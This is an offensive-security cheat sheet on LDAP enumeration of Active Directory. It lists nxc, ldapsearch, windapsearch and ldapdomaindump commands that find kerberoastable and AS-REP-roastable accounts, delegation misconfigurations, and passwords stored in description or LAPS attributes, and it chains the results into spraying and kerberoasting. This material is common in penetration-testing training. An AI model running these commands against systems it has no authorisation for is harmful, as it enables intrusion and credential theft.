LDAP Enumeration - Cheat Sheet

Query Active Directory over LDAP (389 / 636 LDAPS) to pull users, groups,
computers, and the juicy attributes that reveal attack paths - description
fields with passwords, SPNs (kerberoast), AS-REP-able accounts, delegation, and
admin membership. Often works with a null bind, always with any valid account.
Tools: nxc (ldap), ldapsearch, windapsearch, ldapdomaindump.
Replace the placeholders (<...>) with your own values.


Step 1 - Grab the naming context (base DN) + anon check

    # anonymous root DSE (no creds) - reveals defaultNamingContext:
    ldapsearch -x -H ldap://<dc-ip> -s base namingcontexts

    # <domain.local> -> base DN "DC=domain,DC=local"


Step 2 - Fast wins with nxc (recommended first pass)

    nxc ldap <dc-ip> -u <user> -p <pass> --users
    nxc ldap <dc-ip> -u <user> -p <pass> --groups
    nxc ldap <dc-ip> -u <user> -p <pass> --password-not-required   # PASSWD_NOTREQD
    nxc ldap <dc-ip> -u <user> -p <pass> --trusted-for-delegation  # delegation
    nxc ldap <dc-ip> -u <user> -p <pass> -M user-desc              # passwords in descriptions!
    nxc ldap <dc-ip> -u <user> -p <pass> -M get-desc-users
    nxc ldap <dc-ip> -u <user> -p <pass> --kerberoasting out.txt   # SPN accounts
    nxc ldap <dc-ip> -u <user> -p <pass> --asreproast out.txt      # no-preauth accounts
    nxc ldap <dc-ip> -u <user> -p '' --find-delegation


Step 3 - ldapsearch (raw queries, precise control)

    LDAP="-x -H ldap://<dc-ip> -D '<user>@<domain>' -w '<pass>' -b 'DC=domain,DC=local'"

    # all users (sAMAccountName + description):
    ldapsearch $LDAP "(objectClass=user)" sAMAccountName description
    # Domain Admins members:
    ldapsearch $LDAP "(&(objectClass=group)(cn=Domain Admins))" member
    # kerberoastable (users with an SPN):
    ldapsearch $LDAP "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
    # AS-REP roastable (DONT_REQ_PREAUTH = 0x400000 = 4194304):
    ldapsearch $LDAP "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
    # unconstrained delegation (TRUSTED_FOR_DELEGATION = 0x80000 = 524288):
    ldapsearch $LDAP "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName


Step 4 - windapsearch / bulk dumps

    windapsearch -d <domain> --dc-ip <dc-ip> -u <user>@<domain> -p <pass> -U   # users
    windapsearch ... --da            # Domain Admins
    windapsearch ... --privileged-users
    windapsearch ... -PU             # users with SPNs (kerberoast)

    # full offline dump (HTML/JSON/greppable) of the whole directory:
    ldapdomaindump -u '<domain>\<user>' -p '<pass>' <dc-ip>


Step 5 - High-value attributes to grep

    description / info / comment   -> passwords typed by lazy admins
    servicePrincipalName           -> kerberoast (see kerberoasting)
    userAccountControl             -> DONT_REQ_PREAUTH / delegation / disabled
    memberOf                       -> privileged group membership
    msDS-AllowedToDelegateTo       -> constrained delegation targets
    ms-MCS-AdmPwd (LAPS)           -> local admin passwords if you can read them
    adminCount=1                   -> current/former protected (admin) accounts


Step 6 - Feed it forward

  - Users list        -> password spraying (check --pass-pol first)
  - SPN accounts      -> kerberoasting
  - No-preauth users  -> asrep-roasting
  - Delegation flags  -> delegation-abuse
  - Description creds  -> try them / spray
  - Everything        -> BloodHound (LDAP is exactly what it collects)


LDAPS / signing note
  If plain LDAP is blocked or you need to write attributes (RBCD, shadow creds),
  use LDAPS (port 636): add -H ldaps://<dc-ip>. Channel binding/signing may force
  LDAPS for certain operations.


Key idea: AD publishes a staggering amount over LDAP, and any authenticated user
(sometimes an anonymous one) can read most of it. The attributes are the gold:
one query surfaces every SPN to kerberoast, every pre-auth-disabled account to
AS-REP roast, every delegation misconfig, and the passwords admins leave in
description fields. LDAP enumeration is where AD attack paths first become
visible - and it's exactly the data BloodHound ingests.
